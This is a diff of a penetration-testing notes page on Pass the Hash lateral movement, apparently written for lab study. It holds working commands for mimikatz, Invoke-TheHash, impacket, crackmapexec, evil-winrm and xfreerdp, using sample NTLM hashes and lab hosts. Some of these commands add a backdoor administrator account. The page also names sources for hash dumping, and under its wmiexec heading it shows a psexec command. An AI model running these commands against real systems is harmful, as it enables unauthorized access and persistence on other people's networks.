@@ -4,13 +4,20 @@ author: amandaguglieri
 draft: false
 TableOfContents: true
 tags:
-  - privilege escalation
   - windows
+  - lateral movement
 ---
-
 # Pass The Hash
 
-With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. 
+A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password.
+
+The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:
+
+- Dumping the local SAM database from a compromised host.
+- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
+- Pulling the hashes from memory (lsass.exe).
+
+
 
 ## Pass the Hash with Mimikatz (Windows)
 
@@ -21,15 +28,23 @@ see [mimikatz](mimikatz.md)
 # 1. Run mimikatz
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
 # sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
+# /user: the user we want to impersonate
+# /rc4:<NTLM hash>: /rc4 or /NTLM - NTLM hash of the user's password.
 # /run:<Command>: For example /run:cmd.exe
-# 2. After that, we canuse cmd.exe to execute commands in the user's context. 
+
+# 2. After that, we can use cmd.exe to execute commands in the user's context. 
+
+# Example:
+# .\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
 ```
 
 
 ## Pass the Hash with PowerShell Invoke-TheHash (Windows)
 
-[See Powershell Invoke-TheHash](invoke-the-hash.md). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.
+[See Powershell Invoke-TheHash](invoke-the-hash.md). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. 
 
+Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.
 
 When using Invoke-TheHash, we have two options: SMB or WMI command execution.
 
@@ -46,6 +61,9 @@ Import-Module .\Invoke-TheHash.psd1
 Invoke-SMBExec -Target $ip -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 # Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
 # we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.
+
+# Example:
+# Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 ```
 
 [How to generate a reverse shell](reverse-shells.md).
@@ -53,7 +71,12 @@ Invoke-SMBExec -Target $ip -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDA
 ### Invoke-TheHash with WMI
 
 ```powershell
+Import-Module .\Invoke-TheHash.psd1
+
 Invoke-WMIExec -Target $machineName -Domain <DOMAIN> -Username <USERNAME> -Hash 64F12CDDAA88057E06A81B54E73B949B -Command  "net user mark Password123 /add && net localgroup administrators mark /add" 
+
+# Example:
+# Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 ```
 
 [How to generate a reverse shell](reverse-shells.md).
@@ -70,6 +93,10 @@ impacket-psexec <username>@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ### Pass the Hash with impacket-wmiexec
 
 Download from: [https://github.com/fortra/impacket/blob/master/examples/wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py).
+
+```shell-session
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
 
 
 ### Pass the Hash with  impacket-atexec
@@ -96,7 +123,6 @@ crackmapexec smb $ip/24 -u <Administrator> -d . -H <hash> -x whoami
 ```
 
 
-
 ## Pass the Hash with evil-winrm (Linux)
 
 See [evil-winrm](evil-winrm.md).
@@ -113,6 +139,10 @@ evil-winrm -i $ip -u <username> -H <hash>
 ```bash
 xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:$ip
 # /pth:<hash>   Pass the hash
+
+# Example:
+# xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
 ```
 
 **Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
